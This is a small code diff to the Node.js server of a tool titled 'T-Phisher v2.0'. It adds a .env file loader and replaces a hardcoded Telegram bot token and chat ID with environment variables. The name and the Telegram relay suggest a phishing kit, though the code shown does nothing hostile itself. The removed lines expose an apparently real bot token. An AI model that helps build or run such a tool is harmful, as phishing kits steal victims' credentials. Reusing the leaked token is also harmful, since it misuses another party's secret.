@@ -1,4 +1,5 @@
 // T-Phisher v2.0 — Enhanced Server with Telegram Integration & WebSocket Routing
+const fs       = require('fs');
 const { exec } = require('child_process');
 const express  = require('express');
 const path     = require('path');
@@ -6,10 +7,29 @@ const http     = require('http');
 const WebSocket = require('ws');
 const TelegramBot = require('node-telegram-bot-api');
 
+// Load environment variables from .env file if it exists
+const envPath = path.join(__dirname, '.env');
+if (fs.existsSync(envPath)) {
+  const envContent = fs.readFileSync(envPath, 'utf8');
+  envContent.split(/\r?\n/).forEach(line => {
+    const trimmedLine = line.trim();
+    if (trimmedLine && !trimmedLine.startsWith('#')) {
+      const equalsIdx = trimmedLine.indexOf('=');
+      if (equalsIdx > 0) {
+        const key = trimmedLine.substring(0, equalsIdx).trim();
+        const val = trimmedLine.substring(equalsIdx + 1).trim().replace(/^["']|["']$/g, '');
+        if (key && process.env[key] === undefined) {
+          process.env[key] = val;
+        }
+      }
+    }
+  });
+}
+
 // ─── Configuration ────────────────────────────────────────────────────────────
 const PORT      = process.env.PORT || 3000;
-const BOT_TOKEN = '8013439584:AAGX2En5Q9cfbUu_yU5Zi3HUwhOs4FMlbzg';
-const CHAT_ID   = '8262870180';
+const BOT_TOKEN = process.env.BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN';
+const CHAT_ID   = process.env.CHAT_ID || 'YOUR_TELEGRAM_CHAT_ID';
 
 // ─── Initialize Core Services ─────────────────────────────────────────────────
 const app    = express();
